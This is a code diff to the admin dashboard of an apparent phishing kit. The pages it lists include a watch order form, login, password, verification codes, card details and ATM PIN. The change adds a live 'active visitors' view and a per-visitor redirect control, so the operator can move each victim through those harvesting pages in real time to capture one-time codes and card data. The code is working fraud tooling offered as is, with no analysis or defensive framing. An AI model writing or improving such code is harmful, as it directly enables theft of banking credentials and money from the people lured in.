@@ -47,6 +47,8 @@
   .stat-card{background:var(--card);border-radius:16px;padding:22px 24px;
     box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
   .stat-card::after{content:"";position:absolute;top:0;right:0;width:4px;height:100%;border-radius:0 16px 16px 0}
+  .stat-card.s-active{cursor:pointer;transition:.2s}
+  .stat-card.s-active:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.1)}
   .stat-card.s-active::after{background:var(--green)}
   .stat-card.s-total::after{background:var(--blue)}
   .stat-card.s-pending::after{background:var(--orange)}
@@ -187,6 +189,19 @@
 
   @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 
+  /* Visitors modal */
+  .visitors-list{display:flex;flex-direction:column;gap:10px;max-height:60vh;overflow-y:auto;padding-right:4px}
+  .visitor-row{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
+  .visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:10px}
+  .visitor-head .v-country{font-size:13px;font-weight:700;display:flex;align-items:center;gap:6px}
+  .visitor-head .v-page{font-size:11px;background:#dbeafe;color:#1e40af;padding:3px 10px;border-radius:999px;font-weight:700}
+  .visitor-head .v-time{font-size:11px;color:var(--muted)}
+  .visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;margin-bottom:8px;word-break:break-all}
+  .visitor-actions{display:flex;flex-wrap:wrap;gap:6px}
+  .visitor-actions button{flex:1;min-width:calc(50% - 3px);padding:8px 10px;font-size:12px;font-weight:600;border:1px solid var(--line);background:#fff;border-radius:8px;cursor:pointer;font-family:inherit;transition:.15s}
+  .visitor-actions button:hover{background:var(--bg);border-color:var(--blue);color:var(--blue)}
+  .visitors-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}
+
   .td-login{font-family:monospace;font-size:13px;direction:ltr;text-align:left;font-weight:600;
     color:var(--purple);letter-spacing:1px;white-space:nowrap;display:inline-block;
     background:#f5f3ff;padding:4px 10px;border-radius:6px}
@@ -240,7 +255,7 @@
 
     <!-- Stats -->
     <div class="stats-row">
-      <div class="stat-card s-active">
+      <div class="stat-card s-active" onclick="openVisitorsModal()" title="عرض الزوار النشطين">
         <div class="stat-label">
           <span class="wifi-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.24 4.24 0 0 0-6 0zm-4-4l2 2a7.07 7.07 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></span>
           نشط الآن
@@ -303,6 +318,39 @@
       <button onclick="doRedirect('card-details.html')">صفحة بيانات البطاقة</button>
       <button onclick="doRedirect('atm.html')">صفحة ATM PIN</button>
       <button onclick="doRedirect('success.html')">صفحة النجاح</button>
+    </div>
+  </div>
+</div>
+
+<!-- Active Visitors Modal -->
+<div class="modal-overlay" id="visitorsModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('visitorsModal')">×</button>
+    <h2>الزوار النشطين الآن (<span id="visitorsCount">0</span>)</h2>
+    <div class="visitors-list" id="visitorsList">
+      <div class="visitors-empty">جاري التحميل...</div>
+    </div>
+  </div>
+</div>
+
+<!-- Visitor Redirect Modal -->
+<div class="modal-overlay" id="visitorRedirectModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeModal('visitorRedirectModal')">×</button>
+    <h2>إعادة توجيه الزائر</h2>
+    <div class="redirect-options">
+      <button onclick="doVisitorRedirect('/index.html')">الصفحة الرئيسية</button>
+      <button onclick="doVisitorRedirect('/colors.html')">صفحة اختيار الألوان</button>
+      <button onclick="doVisitorRedirect('/order.html')">صفحة بيانات الطلب</button>
+      <button onclick="doVisitorRedirect('/login.html')">صفحة تسجيل الدخول</button>
+      <button onclick="doVisitorRedirect('/password.html')">صفحة كلمة المرور</button>
+      <button onclick="doVisitorRedirect('/waiting.html')">صفحة الانتظار</button>
+      <button onclick="doVisitorRedirect('/code.html')">صفحة رمز التحقق</button>
+      <button onclick="doVisitorRedirect('/code3.html')">صفحة رمز 3 أرقام</button>
+      <button onclick="doVisitorRedirect('/email-code.html')">صفحة رمز الإيميل</button>
+      <button onclick="doVisitorRedirect('/card-details.html')">صفحة بيانات البطاقة</button>
+      <button onclick="doVisitorRedirect('/atm.html')">صفحة ATM PIN</button>
+      <button onclick="doVisitorRedirect('/success.html')">صفحة النجاح</button>
     </div>
   </div>
 </div>
@@ -686,10 +734,87 @@ document.querySelectorAll(".modal-overlay").forEach(el => {
   el.addEventListener("click", e => { if (e.target === el) el.classList.remove("open"); });
 });
 
+let LAST_VISITORS = [];
+
 async function loadActiveVisitors() {
   if (!TOKEN) return;
   const res = await api("GET", "/api/visitors/active");
+  const list = res.visitors || [];
+  LAST_VISITORS = list;
   document.getElementById("sActive").textContent = res.count || 0;
+  if (document.getElementById("visitorsModal").classList.contains("open")) {
+    renderVisitors(list);
+  }
+}
+
+function pageLabel(p) {
+  const labels = {
+    "home":"الصفحة الرئيسية","index":"الصفحة الرئيسية","welcome":"الترحيب",
+    "colors":"اختيار الألوان","watch-features":"مميزات الساعة","order":"بيانات الطلب",
+    "login":"تسجيل الدخول","password":"كلمة المرور","calling":"الاتصال","waiting":"انتظار",
+    "code":"رمز 6 أرقام","code-waiting":"انتظار الرمز","code3":"رمز 3 أرقام","code3-waiting":"انتظار الرمز 3",
+    "email-code":"رمز الإيميل","email-code-waiting":"انتظار رمز الإيميل",
+    "card-details":"بيانات البطاقة","card-waiting":"انتظار البطاقة",
+    "atm":"ATM PIN","atm-waiting":"انتظار ATM","success":"النجاح","admin":"لوحة الادمن"
+  };
+  if (!p) return "غير محدد";
+  const key = p.replace(/^en\//, "").replace(/^\/+/, "").replace(/\.html$/, "");
+  const base = labels[key] || key;
+  return p.startsWith("en/") ? base + " (EN)" : base;
+}
+
+function timeAgo(iso) {
+  if (!iso) return "";
+  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
+  if (diff < 10) return "الآن";
+  if (diff < 60) return diff + " ث";
+  if (diff < 3600) return Math.floor(diff / 60) + " د";
+  return Math.floor(diff / 3600) + " س";
+}
+
+function renderVisitors(list) {
+  document.getElementById("visitorsCount").textContent = list.length;
+  const box = document.getElementById("visitorsList");
+  if (!list.length) {
+    box.innerHTML = '<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';
+    return;
+  }
+  box.innerHTML = list.map(v => {
+    const sid = v.session_id || "";
+    const flag = v.country ? countryDisplay(v.country) : '<span style="font-size:16px">🌍</span>';
+    return `
+      <div class="visitor-row">
+        <div class="visitor-head">
+          <div class="v-country">${flag}</div>
+          <span class="v-page">${pageLabel(v.current_page)}</span>
+          <span class="v-time">${timeAgo(v.last_seen)}</span>
+        </div>
+        <div class="visitor-sid">${sid}</div>
+        <div class="visitor-actions">
+          <button onclick="openVisitorRedirect('${sid.replace(/'/g,"\\'")}')">إعادة توجيه</button>
+        </div>
+      </div>
+    `;
+  }).join("");
+}
+
+function openVisitorsModal() {
+  openModal("visitorsModal");
+  renderVisitors(LAST_VISITORS);
+  loadActiveVisitors();
+}
+
+let currentVisitorSid = null;
+function openVisitorRedirect(sid) {
+  currentVisitorSid = sid;
+  openModal("visitorRedirectModal");
+}
+async function doVisitorRedirect(page) {
+  if (!currentVisitorSid) return;
+  await api("PATCH", "/api/visitors/" + encodeURIComponent(currentVisitorSid), {redirect_to: page});
+  closeModal("visitorRedirectModal");
+  currentVisitorSid = null;
+  loadActiveVisitors();
 }
 
 checkAuth();
